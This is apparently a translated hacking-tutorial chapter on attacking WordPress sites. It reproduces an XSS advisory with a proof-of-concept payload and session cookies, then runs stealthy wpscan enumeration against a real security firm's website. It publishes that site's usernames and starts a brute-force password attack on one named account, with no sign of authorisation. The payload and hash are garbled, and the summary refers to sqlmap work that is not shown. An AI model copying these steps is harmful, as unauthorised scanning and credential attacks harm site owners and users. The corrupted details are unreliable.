

# WordPress 自定义联系表单跨站脚本攻击

作者：SINA Rabbani
发布于 2012 年 5 月 11 日

WordPress 自定义联系表单存在多个跨站脚本漏洞。

tags | 利用，漏洞，xss
MD5 | a87fa4c3207c8d7cc65ddaabb2235922d
下载 | 收藏 | 评论 (0)

## 相关文件

## 分享此内容

喜欢 0
Tweet
LinkedIn
Reddit
Digg
StumbleUpon

更换镜像

下载

---BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

WordPress 安全审计
自定义联系表单

1. 跨站脚本攻击（反射型）

1.1. http://127.0.0.1/wp-admin/options-general.php [任意提供的请求参数名]
1.2. http://127.0.0.1/wp-admin/options-general.php [任意提供的请求参数名]
1.3. http://127.0.0.1/wp-admin/options-general.php [x 参数]

### 问题背景

反射型跨站脚本漏洞发生在数据从请求中被复制并以不安全的方式回显到应用的即时响应中时。攻击者可以利用该漏洞构造一个请求，如果由另一个应用用户发出，将导致攻击者提供的 JavaScript 代码在该用户与应用程序会话的浏览器中执行。

攻击者提供的代码可以执行多种操作，例如窃取受害者的会话令牌或登录凭据，以受害者身份执行任意操作，以及记录其按键。

此概念验证（PoC）攻击表明，可以向应用程序响应中注入任意 JavaScript。

```
/wp-admin/options-general.php?page=bb2_options&#x3C;SCRIPT&#x26XXS32;//#3C\SCRIPT//#6C4C\SCRIP/cdC#9><script>alert(1)</script>:#6abbb2ef55f5%3E
```

```
HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Cookie: wordpress_5c01e08f0f95f039102cbe8366c5c7f3=admin%7C1334178029%7C0cb3e6d7ebff4d014b08f8f399e7931d9;
bb2_scrummer = 1534008940-127.0.1;
PHPSESSID=dp0pohl4p21uuw57ek61pdbar76;
wordpress_test_cookie=WP+Cookie+check;
wp-settings-1=widgets_access%300f%82e6uploader%30127;wp-settings-time-1=1334005690;
wordpress_logged_in_5c01e08f0f95f039102cbe8366c5c7f3=admin%7C1334178029%7C0b90d09df0911bd2b367c018b9081811a
```

正如你上面所见，www.packetstormsecurity.com 早在 2012 年就首次发现了该联系表单中的这个跨站脚本或 XSS 漏洞，但显然直到 2019 年仍未修复。如果我们属于该站点的渗透测试团队，我们的下一步任务将是使用该 POC（概念验证）测试该漏洞是否实际存在，也就是安全研究人员在此安全警报中概述的攻击，如下所示。

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_451_0.png)

### 不安全的信息安全公司

我总是觉得有些好笑，很多安全公司在保护自己的网站方面做得很糟糕。最著名的例子是 2011 年，广受关注且声誉良好的美国信息安全公司 HBGary，其网站被黑客入侵。当时 HBGary 正在攻击 loosely organized（松散组织）的黑客团体 Anonymous，随后 Anonymous 决定进行反击。成千上万的文件和电子邮件被发布到网络上，这对该公司及其客户来说都极具尴尬色彩（客户包括美国许多最强大的公司）。我不确定他们的客户对此有何感受，但如果连自己都无法保护的人去保护我的信息，我会很犹豫。

我们中间可能有一个现代版的 HBGary。信息安全公司 [www.cybrary.it](www.cybrary.it) 拥有一个基于 WordPress 构建的网站。让我们看看他们的网站是否安全。

为了扫描 cybrary.it，让我们使用上面使用的标准命令，但让我们添加另一个选项来枚举用户。该选项将尝试识别具有更新和更改站点权限的用户，本质上是 webmaster（网站管理员）权限。该选项是 `--enumerate u`，我们可以简单地在我们的命令后追加它，例如：`kali > wpscan -url [https://www.cybrary.it](https://www.cybrary.it) -enumerate u`

当命令运行时，它返回一个错误，指出该站点 NOT 运行 WordPress。这很奇怪，因为我相当确定它运行的是 WordPress。

有时网站有负载均衡器和 DoS 保护技术，限制了这些类型的扫描。幸运的是，wpscan 有一种隐蔽模式，有时能够绕过这些保护。让我们通过在命令末尾添加选项 `–stealthy` 来尝试。

```
kali > wpscan -url [https://www.cybrary.it](https://www.cybrary.it) -enumerate u -stealthy
```

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_453_0.png)

```
root@kali-2019:~# wpscan --url https://www.cybrary.it --enumerate u --stealthy
```

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_455_0.png)

```
WordPress Security Scanner by the WPScan Team
Version 3.4.3
Sponsored by Sucuri - https://sucuri.net
@_WPScan_, @ethicalhacker3r, @erwan_lr, @FireFart_

URL: https://www.cybrary.it/
Started: Mon Aug 12 14:28:44 2019

Interesting Finding(s):

https://www.cybrary.it/
Interesting Entries:
Server: nginx
via: 1.1 b7bdad6e794db75fcc11fe5733aa7ccc.cloudfront.net (CloudFront)
X-amz-cf-pop: DFW50-C
X-amz-cf-id: pzc2GRuRCIXH-BGXPTWvYLm9BYJFC9cvow_B0BwgVApqfxQwNoXhgp==
Found By: Headers (Passive Detection)
Confidence: 100%

https://www.cybrary.it/xmlrpc.php
Found By: Headers (Passive Detection)
Confidence: 80%
Confirmed By: Link Tag (Passive Detection), 30% confidence
References:
http://codex.wordpress.org/XML-RPC_Pingback_API
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

WordPress version 4.7.5 identified (Insecure, released on 2017-05-16).
Detected By: Rss Generator (Passive Detection)
https://www.cybrary.it/feed/, <generator>https://wordpress.org/?v=4.7.5</generator>
https://www.cybrary.it/comments/feed/, <generator>https://wordpress.org/?v=4.7.5</generator>
https://www.cybrary.it/home/feed/, <generator>https://wordpress.org/?v=4.7.5</generator>

27 vulnerabilities identified:
```

```
[+] Enumerating Users

[i] User(s) Identified:

[+] lpark
    | Detected By: Rss Generator (Passive Detection)

[+] Tatianna
    | Detected By: Rss Generator (Passive Detection)

[+] angelawood
    | Detected By: Rss Generator (Passive Detection)

[+] thorlacher2322
    | Detected By: Rss Generator (Passive Detection)
```

正如你所见，我们的扫描能够绕过他们的保护，并发现了二十七个漏洞！

此外，它还能够检测到系统中的多个用户。

另外，一旦识别出用户，wpscan 具有针对 WordPress 站点的暴力破解密码功能。这种暴力破解功能实际上绕过了表单（从而规避了某些暴力破解保护机制），并将潜在密码直接发送到网站暴露的部分，该部分将密码反馈回进行认证（xmlrpc）。要使用此工具的暴力破解功能，你需要使用 `-U` 选项，后跟 **username**（用户名），以及 `-P` 选项，后跟你想要使用的 **password list**（密码列表）。

```text
root@kali:~$ wpscan --url https://www.cybrary.it --stealthy -U lpark -P /root/top1000passwords

  _  _____   
 | |/ ____| | |
 | | |  _| | |_
 | | |___| | /\
 |_|_____| |_/

  WordPress Security Scanner by the WPScan Team
  Version 3.4.3
  Sponsored by Sucuri - https://sucuri.net
  @WPScan_, @ethicalhack3r, @erwan_lr, @FireFart

[+] URL: https://www.cybrary.it/
[+] Started: Thu Aug 15 16:40:53 2019

[i] No Config Backups Found.

[+] Performing password attack on WP Login against 1 user/s
Brute 1park / master  Time: 00:00:19 >> (107 / 1000) 10.70% ETA: 00:02:39
```

在这种情况下，让我们尝试暴力破解用户 **lpark**，并使用我们的 top1000passwords 列表，例如：`kali > wpscan –url https://www.cybrary.it –stealthy –U lpark –P /root/top1000passwords` 在扫描并再次列出漏洞后，wpscan 将开始尝试暴力破解该用户。

# **总结**

网络黑客攻击是对构成万维网的惊人应用和基础设施最重要的风险之一。黑客攻击 Web 应用和基础设施的方式几乎不计其数，你所采取的方法将取决于多种因素，包括网站、Web 服务器或用户所使用的技术。

SQL 注入是针对网站最恶毒的攻击之一，绝对也是造成最大经济损失的攻击。在这里，我们能够使用 sqlmap 应用程序对数据库进行指纹识别并提取关键信息。

